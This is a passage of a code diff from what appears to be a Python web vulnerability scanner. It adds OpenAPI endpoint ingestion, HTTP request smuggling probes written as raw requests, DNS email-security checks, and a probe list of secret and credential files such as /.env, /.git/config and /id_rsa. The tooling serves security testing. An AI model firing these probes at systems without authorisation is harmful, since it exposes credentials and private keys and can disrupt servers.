+            warn(f"OpenAPI: Cannot fetch spec from {spec_source}: {_e}"); return
+    else:
+        try:
+            with open(spec_source, "r", encoding="utf-8") as _f:
+                _spec_text = _f.read()
+            good(f"OpenAPI spec loaded from file: {spec_source} ({len(_spec_text)} bytes)")
+        except Exception as _e:
+            warn(f"OpenAPI: Cannot read file {spec_source}: {_e}"); return
+
+    # --- Parse JSON or YAML ---
+    _spec = None
+    try:
+        _spec = json.loads(_spec_text)
+    except Exception:
+        try:
+            import yaml as _yaml
+            _spec = _yaml.safe_load(_spec_text)
+        except ImportError:
+            # Manual YAML fallback: try to parse as JSON after basic cleanup
+            try:
+                import re as _re_y
+                # Very basic YAML→JSON for simple specs
+                _lines = []
+                for _l in _spec_text.splitlines():
+                    _l2 = _re_y.sub(r'^(\s*)(\w[\w-]*):', r'\1"\2":', _l)
+                    _lines.append(_l2)
+                _spec = json.loads("{" + "\n".join(_lines) + "}")
+            except Exception:
+                warn("OpenAPI: Could not parse spec as JSON or YAML. Install PyYAML: pip3 install pyyaml"); return
+        except Exception as _e:
+            warn(f"OpenAPI: Parse error: {_e}"); return
+
+    if not _spec:
+        warn("OpenAPI: Empty spec"); return
+
+    # --- Detect format version ---
+    _version = str(_spec.get("openapi","") or _spec.get("swagger",""))
+    info(f"OpenAPI spec version: {_version or 'unknown'}")
+
+    # --- Determine base URL from spec or fallback to scan target ---
+    _spec_base = base_url.rstrip("/")
+    if "servers" in _spec and _spec["servers"]:
+        _srv_url = _spec["servers"][0].get("url","")
+        if _srv_url.startswith("http"):
+            _spec_base = _srv_url.rstrip("/")
+    elif "host" in _spec:
+        _scheme = _spec.get("schemes",["https"])[0]
+        _base_path = _spec.get("basePath","/").rstrip("/")
+        _spec_base = f"{_scheme}://{_spec['host']}{_base_path}"
+    info(f"API base URL: {_spec_base}")
+
+    # --- Extract paths & operations ---
+    _paths = _spec.get("paths", {})
+    _endpoints = []
+    _auth_schemes = list(_spec.get("securityDefinitions", {}).keys()) + \
+                    list((_spec.get("components",{}) or {}).get("securitySchemes",{}).keys())
+    if _auth_schemes:
+        info(f"Auth schemes detected: {', '.join(_auth_schemes)}")
+
+    for _path, _path_item in _paths.items():
+        if not isinstance(_path_item, dict): continue
+        for _method in ["get","post","put","patch","delete","options","head"]:
+            _op = _path_item.get(_method)
+            if not isinstance(_op, dict): continue
+
+            # Collect parameters
+            _params_all = list(_path_item.get("parameters",[]) or []) + list(_op.get("parameters",[]) or [])
+            _query_params = {}
+            _path_params  = {}
+            _body_fields  = {}
+
+            for _p in _params_all:
+                if not isinstance(_p, dict): continue
+                _pname = _p.get("name","p")
+                _pin   = _p.get("in","")
+                _ptype = _p.get("type","string") or \
+                         ((_p.get("schema") or {}).get("type","string"))
+                _example = _p.get("example") or _p.get("default") or \
+                           ("1" if _ptype in ("integer","number") else "test")
+                if _pin == "query":
+                    _query_params[_pname] = str(_example)
+                elif _pin == "path":
+                    _path_params[_pname]  = str(_example)
+                elif _pin == "header":
+                    pass  # skip for now
+
+            # Request body (OpenAPI 3.x)
+            _rb = _op.get("requestBody",{}) or {}
+            _content = (_rb.get("content",{}) or {})
+            for _ct, _ct_data in _content.items():
+                _schema = (_ct_data.get("schema",{}) or {})
+                _props  = _schema.get("properties",{}) or {}
+                for _fn, _fs in _props.items():
+                    _ftype   = (_fs.get("type","string") if isinstance(_fs,dict) else "string")
+                    _fexample= (_fs.get("example") or _fs.get("default") if isinstance(_fs,dict) else None)
+                    _body_fields[_fn] = str(_fexample or ("1" if _ftype in ("integer","number") else "test"))
+
+            # Build test URL
+            _test_path = _path
+            for _pp, _pv in _path_params.items():
+                _test_path = _test_path.replace(f"{{{_pp}}}", _pv)
+            _test_url = _spec_base + _test_path
+            if _query_params:
+                from urllib.parse import urlencode as _ue2
+                _test_url += "?" + _ue2(_query_params)
+
+            _ep = {
+                "method":        _method.upper(),
+                "path":          _path,
+                "test_url":      _test_url,
+                "query_params":  _query_params,
+                "path_params":   _path_params,
+                "body_fields":   _body_fields,
+                "summary":       _op.get("summary","")[:80],
+                "tags":          _op.get("tags",["api"]),
+                "auth_required": bool(_op.get("security") or _spec.get("security")),
+                "operation_id":  _op.get("operationId",""),
+            }
+            _endpoints.append(_ep)
+
+    info(f"OpenAPI: {len(_endpoints)} endpoint(s) extracted from {len(_paths)} path(s)")
+
+    # --- IDOR check: paths with {id} or {userId} ---
+    _idor_paths = [e for e in _endpoints if any("{" in e["path"] and k in e["path"].lower()
+                   for k in ["id","user","account","profile","order","item"])]
+    if _idor_paths:
+        warn(f"OpenAPI IDOR candidates: {len(_idor_paths)} path(s) with ID parameters")
+        for _ep in _idor_paths[:5]:
+            add("openapi_scan", {
+                "method": _ep["method"], "path": _ep["path"],
+                "test_url": _ep["test_url"], "severity": "Medium",
+                "title": f"OpenAPI IDOR Candidate: {_ep['method']} {_ep['path']}",
+                "description": f"Endpoint '{_ep['method']} {_ep['path']}' takes an ID-like path parameter. Test for IDOR by substituting other users' IDs.",
+                "recommendation": "Ensure object-level authorization is enforced for all ID-based endpoints.",
+                "evidence": f"Path: {_ep['path']} | Params: {list(_ep['path_params'].keys())}"})
+
+    # --- Unauthenticated endpoints ---
+    _unauth = [e for e in _endpoints if not e["auth_required"] and e["method"] in ("POST","PUT","DELETE","PATCH")]
+    if _unauth:
+        warn(f"OpenAPI: {len(_unauth)} write-method endpoint(s) with no declared auth")
+        for _ep in _unauth[:3]:
+            add("openapi_scan", {
+                "method": _ep["method"], "path": _ep["path"],
+                "test_url": _ep["test_url"], "severity": "Medium",
+                "title": f"OpenAPI Unauthenticated Write: {_ep['method']} {_ep['path']}",
+                "description": f"Endpoint '{_ep['method']} {_ep['path']}' has no declared security requirement. Verify it enforces authentication.",
+                "recommendation": "Declare security requirements for all write endpoints in the OpenAPI spec and enforce them server-side.",
+                "evidence": f"No 'security' field on operation {_ep['operation_id'] or _ep['path']}"})
+
+    # --- Auth schemes analysis ---
+    _spec_components = _spec.get("components",{}) or {}
+    _sec_schemes = {**(_spec.get("securityDefinitions",{}) or {}),
+                    **(_spec_components.get("securitySchemes",{}) or {})}
+    for _sname, _sdef in _sec_schemes.items():
+        if not isinstance(_sdef, dict): continue
+        _stype = _sdef.get("type","").lower()
+        _sin   = _sdef.get("in","").lower()
+        if _stype == "apikey" and _sin == "query":
+            warn(f"OpenAPI: API key passed in query string ('{_sname}') — risks key leakage in logs/cache")
+            add("openapi_scan", {
+                "severity": "Medium", "title": f"API Key in Query String: {_sname}",
+                "description": "API key transmitted as URL query parameter. Easily captured in server logs, browser history, and intermediate caches.",
+                "recommendation": "Move API key to Authorization header or X-API-Key header.",
+                "evidence": f"securityScheme '{_sname}': type=apiKey in=query"})
+        if _stype == "http" and _sdef.get("scheme","").lower() == "basic":
+            warn(f"OpenAPI: HTTP Basic auth used ('{_sname}') — credentials sent base64 unencrypted over HTTP")
+            add("openapi_scan", {
+                "severity": "Medium", "title": f"HTTP Basic Auth Declared: {_sname}",
+                "description": "HTTP Basic Authentication sends credentials as base64-encoded username:password. Without HTTPS it is trivially captured.",
+                "recommendation": "Replace Basic Auth with OAuth 2.0 / Bearer tokens.",
+                "evidence": f"securityScheme '{_sname}': type=http scheme=basic"})
+
+    # --- Store endpoints globally for other modules ---
+    OPENAPI_ENDPOINTS.extend(_endpoints)
+
+    # --- Print summary table ---
+    info(f"\n{'Method':<8} {'Auth':<5} {'Path'}")
+    info(f"{'-'*8} {'-'*5} {'-'*50}")
+    for _ep in _endpoints[:20]:
+        _a = "✓" if _ep["auth_required"] else "✗"
+        info(f"  {_ep['method']:<6} {_a:<5} {_ep['path']}")
+    if len(_endpoints) > 20:
+        info(f"  ... and {len(_endpoints)-20} more endpoints")
+
+    good(f"OpenAPI ingestion complete: {len(_endpoints)} endpoints ready for injection into scan modules")
+    add("openapi_scan", {
+        "severity": "Info",
+        "title": f"OpenAPI Spec Parsed: {len(_endpoints)} Endpoints",
+        "description": f"Spec version {_version} parsed successfully. {len(_endpoints)} endpoints extracted. Auth schemes: {', '.join(_auth_schemes) or 'none declared'}.",
+        "recommendation": "Review all extracted endpoints for missing auth, excessive permissions, and sensitive data exposure.",
+        "evidence": f"Source: {spec_source} | Paths: {len(_paths)} | Endpoints: {len(_endpoints)} | Auth schemes: {_auth_schemes}"})
+
+
+def _openapi_inject_sqli(url):
+    """Inject OpenAPI-discovered endpoints into SQLi scanner."""
+    if not OPENAPI_ENDPOINTS:
+        return
+    info(f"SQLi → injecting {min(len(OPENAPI_ENDPOINTS),15)} OpenAPI endpoint(s)...")
+    for _ep in OPENAPI_ENDPOINTS[:15]:
+        if _ep["query_params"] or _ep["body_fields"]:
+            try:
+                sqli_scan(_ep["test_url"])
+            except Exception:
+                pass
+
+
+def _openapi_inject_xss(url):
+    """Inject OpenAPI-discovered endpoints into XSS scanner."""
+    if not OPENAPI_ENDPOINTS:
+        return
+    info(f"XSS → injecting {min(len(OPENAPI_ENDPOINTS),15)} OpenAPI endpoint(s)...")
+    for _ep in OPENAPI_ENDPOINTS[:15]:
+        if _ep["query_params"]:
+            try:
+                xss_scan(_ep["test_url"])
+            except Exception:
+                pass
+
+
+def _openapi_inject_idor(url):
+    """Inject OpenAPI IDOR candidates into IDOR scanner."""
+    if not OPENAPI_ENDPOINTS:
+        return
+    _idor_eps = [e for e in OPENAPI_ENDPOINTS if any("{" in e["path"] for _ in [1])]
+    info(f"IDOR → injecting {min(len(_idor_eps),10)} OpenAPI path-param endpoint(s)...")
+    for _ep in _idor_eps[:10]:
+        try:
+            idor_scan(_ep["test_url"], skip_idor=False)
+        except Exception:
+            pass
+
+
+# ═══ MODULE 87 — HTTP REQUEST SMUGGLING (v12.0) ══════════════════════
+def http_smuggling_scan(url):
+    """MODULE 87 — Detect HTTP/1.1 request smuggling (CL.TE and TE.CL).
+    Sends crafted requests and detects timing anomalies / server confusion."""
+    if _module_skip("http_smuggling"): info("Skipping HTTP Smuggling (already done)"); return
+    section("MODULE 87 — HTTP REQUEST SMUGGLING","🚢")
+
+    parsed = urlparse(url)
+    host   = parsed.netloc
+    port   = 443 if parsed.scheme == "https" else 80
+    if ":" in host:
+        host, _p = host.rsplit(":", 1)
+        port = int(_p)
+    is_https = parsed.scheme == "https"
+    path = parsed.path or "/"
+    if parsed.query:
+        path += "?" + parsed.query
+
+    _found_smug = False
+
+    def _raw_request(raw_bytes, timeout=12):
+        """Send raw bytes over socket (bypasses requests library normalisation)."""
+        import socket, ssl as _ssl
+        try:
+            sock = socket.create_connection((host, port), timeout=timeout)
+            if is_https:
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(raw_bytes)
+            resp = b""
+            sock.settimeout(timeout)
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                    if not chunk: break
+                    resp += chunk
+                    if len(resp) > 65536: break
+                except Exception:
+                    break
+            sock.close()
+            return resp.decode("utf-8", errors="replace")
+        except Exception as _e:
+            return f"ERROR:{_e}"
+
+    # --- Test 1: CL.TE Smuggling ---
+    # Content-Length says body is 6 bytes, but Transfer-Encoding: chunked body is longer.
+    # A vulnerable front-end uses CL (stops at 6), back-end uses TE (reads chunk=rest).
+    info("Testing CL.TE request smuggling...")
+    _cl_te = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: 6\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "3\r\n"
+        "abc\r\n"
+        "0\r\n"
+        "\r\n"
+    ).encode()
+    _t0 = time.time()
+    _r1 = _raw_request(_cl_te, timeout=12)
+    _d1 = time.time() - _t0
+    if "ERROR:" not in _r1:
+        if "400" in _r1[:200] or "invalid" in _r1[:500].lower():
+            info("CL.TE: Server returned 400 — may reject chunked encoding (potential indicator)")
+        elif _d1 > 8:
+            _found_smug = True
+            vuln("HTTP Request Smuggling — CL.TE timing anomaly detected", "High")
+            add("http_smuggling", {
+                "attack": "CL.TE",
+                "severity": "High",
+                "title": "HTTP Request Smuggling — CL.TE Timing Anomaly",
+                "description": "CL.TE smuggling probe caused unusual server delay, suggesting the front-end proxy and back-end server disagree on body boundary. An attacker can prefix a malicious partial request to poison the back-end pipeline.",
+                "recommendation": "Normalize requests at the proxy layer. Reject ambiguous CL+TE requests. Use HTTP/2 end-to-end. Disable backend connection reuse for untrusted clients.",
+                "evidence": f"CL.TE probe response time: {_d1:.1f}s (expected <3s)"})
+    else:
+        info(f"CL.TE test: socket error ({_r1[:60]})")
+
+    # --- Test 2: TE.CL Smuggling ---
+    # Transfer-Encoding: chunked body, but Content-Length is larger than what chunked delivers.
+    info("Testing TE.CL request smuggling...")
+    _te_cl_body = "0\r\n\r\nGET /smuggle-test HTTP/1.1\r\nHost: smuggle-detect\r\n\r\n"
+    _te_cl = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: {len(_te_cl_body) + 100}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        + _te_cl_body
+    ).encode()
+    _t1 = time.time()
+    _r2 = _raw_request(_te_cl, timeout=12)
+    _d2 = time.time() - _t1
+    if "ERROR:" not in _r2:
+        # Indicators: timeout, or response to injected /smuggle-test path
+        if _d2 > 8 or "smuggle-detect" in _r2.lower():
+            _found_smug = True
+            vuln("HTTP Request Smuggling — TE.CL anomaly detected", "High")
+            add("http_smuggling", {
+                "attack": "TE.CL",
+                "severity": "High",
+                "title": "HTTP Request Smuggling — TE.CL Anomaly",
+                "description": "TE.CL probe caused a timing anomaly or reflected injected host. The back-end may process the smuggled partial request prefix.",
+                "recommendation": "Reject requests with both Content-Length and Transfer-Encoding headers. Enforce HTTP/2 on all proxy-to-backend links.",
+                "evidence": f"TE.CL probe time: {_d2:.1f}s | Response contains injected host: {'smuggle-detect' in _r2.lower()}"})
+    else:
+        info(f"TE.CL test: socket error ({_r2[:60]})")
+
+    # --- Test 3: TE.TE obfuscation (chunked variant) ---
+    info("Testing TE.TE Transfer-Encoding obfuscation...")
+    _te_te = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: 4\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Transfer-Encoding: identity\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "data"
+    ).encode()
+    _r3 = _raw_request(_te_te, timeout=8)
+    if "ERROR:" not in _r3 and "400" not in _r3[:200]:
+        # Server accepted dual TE headers — may be vulnerable to TE.TE
+        warn("HTTP TE.TE: Server accepted dual Transfer-Encoding headers (possible TE.TE smuggling vector)")
+        add("http_smuggling", {
+            "attack": "TE.TE",
+            "severity": "Medium",
+            "title": "HTTP TE.TE — Dual Transfer-Encoding Headers Accepted",
+            "description": "Server accepted a request with two Transfer-Encoding headers without returning HTTP 400. This can enable TE.TE request smuggling by confusing frontend/backend parsing.",
+            "recommendation": "Reject any request containing multiple Transfer-Encoding headers. Enable strict HTTP parsing.",
+            "evidence": "POST with 'Transfer-Encoding: chunked' + 'Transfer-Encoding: identity' accepted (not 400)"})
+
+    if not _found_smug:
+        good("No HTTP Request Smuggling indicators detected (CL.TE, TE.CL, TE.TE)")
+    _module_done("http_smuggling")
+
+
+# ═══ MODULE 88 — BACKUP FILE DISCOVERY (v12.0) ═══════════════════════
+def backup_file_scan(url):
+    """MODULE 88 — Discover backup, temp, config and sensitive files left on server."""
+    if _module_skip("backup_files"): info("Skipping Backup File Discovery (already done)"); return
+    section("MODULE 88 — BACKUP & SENSITIVE FILE DISCOVERY","🗄️")
+
+    parsed   = urlparse(url)
+    base     = f"{parsed.scheme}://{parsed.netloc}"
+    base_path = parsed.path.rstrip("/") or ""
+
+    # Derive filename variants from URL path
+    _path_parts = [p for p in base_path.split("/") if p]
+    _base_names  = []
+    if _path_parts:
+        _last = _path_parts[-1]
+        # Strip extension if present
+        if "." in _last:
+            _base_names.append(_last.rsplit(".",1)[0])
+        _base_names.append(_last)
+    _base_names += ["index","config","app","web","database","db","settings","admin",
+                    "backup","data","api","main","site","server"]
+
+    # Extensions to try for each base name
+    BACKUP_EXT = [
+        ".bak",".bak1",".bak2",".backup",".old",".old1",".orig",".original",
+        ".save",".saved",".copy",".tmp",".temp",".swp",".swo",".1",".2",
+        ".zip",".tar",".tar.gz",".tgz",".tar.bz2",".gz",
+        ".sql",".sql.gz",".db",".sqlite",".sqlite3",
+        "~","._bak","(1)","(copy)","_backup","_old","_bkp",
+    ]
+
+    # Static sensitive paths always tested (no extension variants)
+    SENSITIVE_PATHS = [
+        "/.env", "/.env.local", "/.env.production", "/.env.backup",
+        "/.env.bak", "/.env.old", "/.env.example",
+        "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
+        "/.svn/entries", "/.hg/hgrc",
+        "/.DS_Store", "/Thumbs.db", "/desktop.ini",
+        "/composer.json", "/composer.lock", "/package.json", "/package-lock.json",
+        "/yarn.lock", "/Pipfile", "/Pipfile.lock", "/requirements.txt",
+        "/Gemfile", "/Gemfile.lock",
+        "/web.config", "/web.config.bak",
+        "/.htaccess", "/.htaccess.bak", "/.htpasswd",
+        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
+        "/config.php", "/config.php.bak", "/configuration.php",
+        "/wp-config.php", "/wp-config.php.bak",
+        "/config.yml", "/config.yaml", "/config.json", "/settings.json",
+        "/application.properties", "/application.yml",
+        "/secrets.json", "/credentials.json", "/key.json", "/keys.json",
+        "/id_rsa", "/id_rsa.pub", "/id_dsa",
+        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
+        "/server-status", "/server-info", "/_profiler",
+        "/adminer.php", "/phpmyadmin/", "/pma/", "/mysql/",
+        "/.bash_history", "/.bash_rc", "/.profile",
+        "/dump.sql", "/backup.sql", "/db.sql", "/database.sql",
+        "/backup.zip", "/site.zip", "/www.zip", "/backup.tar.gz",
+        "/error_log", "/error.log", "/access_log", "/access.log",
+        "/logs/error.log", "/logs/access.log", "/log/error.log",
+        "/logs/", "/log/", "/debug/", "/trace/",
+    ]
+
+    _found_backups = []
+
+    def _check(path):
+        try:
+            full = base + path
+            r = rget(full, timeout=8, allow_redirects=False)
+            # Only flag 200 OK responses with meaningful content (not empty 200s)
+            if r.status_code == 200 and len(r.text) > 50:
+                ct = r.headers.get("Content-Type","").lower()
+                # Skip if it's clearly HTML (may be a catch-all 200 page)
+                _low = r.text[:500].lower()
+                _is_html_page = "<!doctype" in _low or "<html" in _low
+                # Backup/binary files and plaintext config files should NOT be HTML
+                _is_binary_ext = any(path.endswith(e) for e in [".zip",".tar",".tar.gz",".tgz",".gz",".sql",".db",".sqlite",".sqlite3"])
+                _is_code = any(path.endswith(e) for e in [".php",".py",".rb",".js",".json",".yml",".yaml",".xml",".properties",".env",".bak",".old",".sql",".config",".conf"])
+                _is_text_config = any(x in _low for x in ["password","secret","token","apikey","api_key","database","db_pass","db_name","key =","key=","pwd","username","user =","host =","port ="])
+                if _is_binary_ext or (_is_code and not _is_html_page) or _is_text_config:
+                    severity = "Critical" if any(x in _low for x in ["password","secret","token","apikey","api_key","db_pass","private_key","aws_secret"]) else "High"
+                    return (path, r.status_code, len(r.text), severity)
+                elif not _is_html_page:
+                    return (path, r.status_code, len(r.text), "Medium")
+            return None
+        except Exception:
+            return None
+
+    # Build all paths to test
+    _all_paths = list(SENSITIVE_PATHS)
+    for _bn in _base_names[:5]:
+        for _ext in BACKUP_EXT:
+            _all_paths.append(f"{base_path}/{_bn}{_ext}")
+            _all_paths.append(f"/{_bn}{_ext}")
+
+    info(f"Backup scan: testing {len(_all_paths)} paths...")
+    with ThreadPoolExecutor(max_workers=15) as ex:
+        futs = {ex.submit(_check, p): p for p in _all_paths}
+        for f in as_completed(futs):
+            try:
+                res = f.result()
+                if res:
+                    _path, _code, _size, _sev = res
+                    _found_backups.append((_path, _sev))
+                    vuln(f"Backup/Sensitive file FOUND: {_path} [{_code}] {_size}B", _sev)
+                    add("backup_files", {
+                        "path": _path,
+                        "url": base + _path,
+                        "size_bytes": _size,
+                        "confirmed": True,
+                        "severity": _sev,
+                        "title": f"Sensitive/Backup File Exposed: {_path}",
+                        "description": f"File '{_path}' returned HTTP 200 with {_size} bytes of content. May contain credentials, source code, database dumps, or configuration secrets.",
+                        "recommendation": "Remove backup and temporary files from the web root. Add rules to .htaccess/nginx to deny access to .bak/.env/.sql files. Rotate any exposed credentials immediately.",
+                        "evidence": f"HTTP 200 at {base+_path} | Content-length: {_size}B"})
+            except Exception:
+                pass
+
+    if not _found_backups:
+        good("No accessible backup or sensitive files found")
+    else:
+        warn(f"Backup/Sensitive file scan: {len(_found_backups)} file(s) exposed!")
+    _module_done("backup_files")
+
+
+# ═══ MODULE 89 — EMAIL SECURITY (SPF / DKIM / DMARC) (v12.0) ════════
+def email_security_scan(url, domain):
+    """MODULE 89 — Check SPF, DKIM, and DMARC DNS records for email spoofing risk."""
+    if _module_skip("email_security"): info("Skipping Email Security (already done)"); return
+    section("MODULE 89 — EMAIL SECURITY (SPF / DKIM / DMARC)","📧")
+
+    try:
+        import dns.resolver as _dns_res
+    except ImportError:
+        try:
+            import subprocess as _sp
+            _dns_res = None
+        except Exception:
+            info("Email security: dnspython not installed — using nslookup fallback")
+            _dns_res = None
+
+    def _dns_txt(name):
+        """Return list of TXT record strings for a DNS name."""
+        if _dns_res:
+            try:
+                answers = _dns_res.resolve(name, "TXT")
+                return [b"".join(r.strings).decode("utf-8", errors="replace") for r in answers]
+            except Exception:
+                return []
+        else:
+            # Fallback: use subprocess nslookup / dig
+            import subprocess as _sp2
+            try:
+                _out = _sp2.run(["dig", "+short", "TXT", name], capture_output=True, text=True, timeout=10)
+                if _out.returncode == 0:
+                    _lines = [l.strip().strip('"') for l in _out.stdout.splitlines() if l.strip()]
+                    return _lines
+            except Exception:
+                pass
+            return []
+
+    # --- SPF ---
+    info(f"Checking SPF record for {domain}...")
+    _spf_records = [r for r in _dns_txt(domain) if r.lower().startswith("v=spf1")]
+    if not _spf_records:
+        vuln(f"SPF record MISSING for {domain}", "High")
+        add("email_security", {
+            "check": "SPF", "domain": domain, "severity": "High",
+            "title": f"SPF Record Missing — {domain} Is Spoofable",
+            "description": f"No SPF TXT record found for {domain}. Without SPF, anyone can send email claiming to be from @{domain}, enabling phishing and BEC attacks.",
+            "recommendation": "Add an SPF record to your DNS: 'v=spf1 include:your-mailprovider.com ~all' (use -all for hard fail). Keep it under 10 DNS lookups.",
+            "evidence": f"No 'v=spf1' TXT record found at {domain}"})
+    else:
+        _spf = _spf_records[0]
+        good(f"SPF record found: {_spf[:120]}")
+        # Check for weak SPF ending
+        if _spf.strip().endswith("+all"):
+            vuln(f"SPF uses '+all' (PASS all) — anyone can send as {domain}!", "Critical")
+            add("email_security", {
+                "check": "SPF_all_plus", "domain": domain, "severity": "Critical",
+                "title": f"SPF +all — All Servers Permitted to Send as {domain}",
+                "description": f"SPF record ends with '+all', authorizing ANY server to send email as @{domain}. This is equivalent to no SPF.",
+                "recommendation": "Change '+all' to '-all' (hard fail) or '~all' (soft fail).",
+                "evidence": f"SPF record: {_spf[:200]}"})
+        elif _spf.strip().endswith("?all"):
+            warn(f"SPF uses '?all' (neutral) — provides no protection for {domain}")
+            add("email_security", {
+                "check": "SPF_all_neutral", "domain": domain, "severity": "Medium",
+                "title": f"SPF ?all — Neutral Policy Provides No Spoofing Protection",
+                "description": "SPF ?all means servers not listed are neither permitted nor blocked. Provides no protection against email spoofing.",
+                "recommendation": "Change '?all' to '~all' or '-all'.",
+                "evidence": f"SPF record: {_spf[:200]}"})
+        elif "~all" in _spf:
+            info(f"SPF uses '~all' (soft fail) — consider upgrading to '-all' for stricter enforcement")
+        elif "-all" in _spf:
+            good(f"SPF uses '-all' (hard fail) — good policy")
+
+    # --- DKIM (check common selectors) ---
+    info(f"Checking DKIM records for {domain} (common selectors)...")
+    DKIM_SELECTORS = [
+        "default","google","mail","dkim","email","smtp","selector1","selector2",
+        "k1","k2","s1","s2","mx","mta","postfix","sendgrid","mailgun","mandrill",
+        "amazonses","sparkpost","mailchimp","zoho","protonmail","office365","m1",
+    ]
+    _dkim_found = []
+    for _sel in DKIM_SELECTORS:
+        _dkim_name = f"{_sel}._domainkey.{domain}"
+        _dkim_recs = _dns_txt(_dkim_name)
+        for _rec in _dkim_recs:
+            if "v=dkim1" in _rec.lower() or "p=" in _rec.lower():
+                _dkim_found.append((_sel, _rec))
+                good(f"DKIM selector '{_sel}' found: {_rec[:100]}...")
+                # Check for weak/empty key
+                if "p=;" in _rec or "p= " in _rec.replace("p=;",""):
+                    vuln(f"DKIM selector '{_sel}' has EMPTY public key (key revoked/broken)", "High")
+                    add("email_security", {
+                        "check": "DKIM_empty_key", "domain": domain, "selector": _sel, "severity": "High",
+                        "title": f"DKIM Selector '{_sel}' Has Empty Public Key",
+                        "description": "An empty 'p=' field means the DKIM key is revoked. Mail signed with this selector will fail DKIM verification, breaking email delivery.",
+                        "recommendation": "Remove the DNS record or replace with a valid DKIM key.",
+                        "evidence": f"DKIM record at {_dkim_name}: {_rec[:200]}"})
+                break
+
+    if not _dkim_found:
+        warn(f"No DKIM records found for {domain} (tested {len(DKIM_SELECTORS)} common selectors)")
+        add("email_security", {
+            "check": "DKIM_missing", "domain": domain, "severity": "Medium",
+            "title": f"DKIM Not Configured — {domain}",
+            "description": f"No DKIM TXT records found for common selectors at {domain}. Without DKIM, email integrity cannot be verified and messages may be altered in transit.",
+            "recommendation": "Configure DKIM with your email provider and publish the public key TXT record under SELECTOR._domainkey.yourdomain.com.",
+            "evidence": f"No 'v=DKIM1' records at any tested selector for {domain}"})
+    else:
+        good(f"DKIM: {len(_dkim_found)} selector(s) found")
+
+    # --- DMARC ---
+    info(f"Checking DMARC record for _dmarc.{domain}...")
+    _dmarc_records = [r for r in _dns_txt(f"_dmarc.{domain}") if "v=dmarc1" in r.lower()]
+    if not _dmarc_records:
+        vuln(f"DMARC record MISSING for {domain}", "High")
+        add("email_security", {
+            "check": "DMARC_missing", "domain": domain, "severity": "High",
+            "title": f"DMARC Record Missing — {domain}",
+            "description": f"No DMARC record at _dmarc.{domain}. Without DMARC, there is no policy telling receiving servers what to do with unauthenticated emails — phishing is easy.",
+            "recommendation": "Add DMARC record: '_dmarc.yourdomain.com TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com\"'. Start with p=none for monitoring, then upgrade to quarantine/reject.",
+            "evidence": f"No 'v=DMARC1' TXT record at _dmarc.{domain}"})
+    else:
+        _dmarc = _dmarc_records[0]
+        good(f"DMARC record found: {_dmarc[:150]}")
+        # Parse policy
+        import re as _re_dm
+        _pol_m = _re_dm.search(r'\bp=(\w+)', _dmarc, _re_dm.IGNORECASE)
+        _pol    = _pol_m.group(1).lower() if _pol_m else "none"
+        _pct_m = _re_dm.search(r'\bpct=(\d+)', _dmarc, _re_dm.IGNORECASE)
+        _pct   = int(_pct_m.group(1)) if _pct_m else 100
+        _rua_m = _re_dm.search(r'\brua=([^;]+)', _dmarc, _re_dm.IGNORECASE)
+        _rua   = _rua_m.group(1).strip() if _rua_m else None
+
+        if _pol == "none":
+            warn(f"DMARC policy is p=none — monitoring only, no emails blocked")
+            add("email_security", {
+                "check": "DMARC_policy_none", "domain": domain, "severity": "Medium",
+                "title": f"DMARC Policy p=none — No Email Blocking",
+                "description": "DMARC is configured but with p=none. Unauthenticated emails are still delivered — no protection against spoofing. Only good as a monitoring step.",
+                "recommendation": "Upgrade DMARC policy to p=quarantine then p=reject after reviewing rua reports.",
+                "evidence": f"DMARC record: {_dmarc[:200]}"})
+        elif _pol == "quarantine":
+            info(f"DMARC p=quarantine (pct={_pct}%) — unauthenticated email goes to spam")
+            if _pct < 100:
+                warn(f"DMARC pct={_pct}% — only {_pct}% of mail covered; increase to 100%")
+        elif _pol == "reject":
+            good(f"DMARC p=reject — maximum protection, unauthenticated email rejected")
+
+        if not _rua:
+            warn("DMARC has no rua= (reporting address) — you won't see SPF/DKIM failures")
+            add("email_security", {
+                "check": "DMARC_no_rua", "domain": domain, "severity": "Low",
+                "title": "DMARC Missing rua= Reporting Address",
+                "description": "No aggregate report address (rua=) in DMARC record. Without reports, you cannot monitor SPF/DKIM failures or detect spoofing attempts.",
+                "recommendation": "Add rua=mailto:dmarc@yourdomain.com (or use a third-party DMARC reporting service).",
+                "evidence": f"DMARC record: {_dmarc[:200]}"})
+
+    _module_done("email_security")
 
 
 # ═══ MODULE 2 — PORT SCANNER (v9.0: 150+ ports + banner grabbing) ═
@@ -2114,31 +3390,68 @@ def sqli_scan(url):
     if _module_skip("sqli"): info("Skipping SQLi (already done)"); return
     section("MODULE 12 — SQL INJECTION","💉")
 
+    # v12.0: Extended DB error signatures for more reliable detection
     DB_ERRORS = {
         "MySQL":      ["you have an error in your sql syntax","mysql_fetch","mysql_num_rows",
-                       "warning: mysql","1064 you have","supplied argument is not"],
+                       "warning: mysql","1064 you have","supplied argument is not",
+                       "mysql_query()","mysql_result()","column count doesn't match",
+                       "unknown column","table 'mysql","access denied for user"],
         "PostgreSQL": ["pg_query()","pg_exec()","syntax error at or near",
-                       "unterminated quoted string","pg_fetch_assoc"],
+                       "unterminated quoted string","pg_fetch_assoc","pg_connect()",
+                       "pgsql error","postgresql query failed","pg_num_rows",
+                       "invalid input syntax for","relation \"","column \""],
         "MSSQL":      ["microsoft sql server","odbc sql server","unclosed quotation mark",
